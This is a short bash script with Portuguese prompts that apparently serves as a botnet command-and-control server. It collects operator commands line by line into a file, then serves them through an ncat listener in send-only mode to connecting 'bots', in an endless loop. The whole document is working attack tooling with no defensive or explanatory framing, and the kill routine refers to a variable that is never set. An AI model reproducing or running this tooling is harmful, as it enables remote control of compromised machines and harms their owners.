#!/bin/bash


while getopts "p:" opt; do
    case $opt in
        p)PORT=$OPTARG; echo "[*] Porta definida: $OPTARG";;
        ?);;
    esac
done

if [[ $# < 2 ]]; then
    echo "Uso: $0 -p PORTA"
    exit 1;
fi

which ncat 2>&1 > /dev/null
if [[ $? != 0 ]]; then
    echo "ncat nao instalado. Instale o nmap.";
    exit 1;
fi

kill_server()
{
	echo "[*] Killing server ..."
	killall ${server_program} > /dev/null 2>&1;
	if [[ $? == 0 ]]; then
		echo "[+] Server has been killed."
	else
		echo "[!] Error killing server.";
	fi
	return 0;
}


server_up()
{
    cmd=""
    clear
    echo "Digite os comandos a serem enviados para os bots linha a linha, ao final, digite EOF";
    while [[ $cmd != "EOF" ]]; do
        read cmd;
        echo $cmd | tr " " "_" >> server.cmds
    done
    ncat -lvp $PORT --send-only < server.cmds 2>/dev/null
    if [[ -f server.cmds ]]; then
        rm server.cmds
    fi
    echo "[*] Comandos foram enviados para o bot."
    return 0;
}

trap 'kill_server; exit 0;' INT TERM;
while [ 1 -eq 1 ]; do
    server_up
done
